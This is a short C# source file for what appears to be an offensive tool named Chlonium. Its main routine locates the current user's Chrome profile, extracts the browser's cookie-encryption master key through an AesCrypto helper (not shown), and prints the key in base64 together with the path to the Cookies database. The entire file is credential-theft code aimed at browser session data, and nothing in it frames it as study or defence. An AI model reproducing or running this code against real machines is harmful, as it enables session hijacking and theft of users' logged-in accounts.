using System;

namespace Chlonium
{
    class Program
    {
        static void Main(string[] args)
        {
            string userLocalstatePath = string.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data", Environment.GetEnvironmentVariable("USERPROFILE"));
            AesCrypto crypto = new AesCrypto(userLocalstatePath);
            byte[] masterKey = crypto.GetEncryptionKey();
            Console.WriteLine("[*] Cookie file = \"{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\"", 
                Environment.GetEnvironmentVariable("USERPROFILE"));
            Console.WriteLine("[+] Masterkey = {0}", Convert.ToBase64String(masterKey));
        }
    }
}
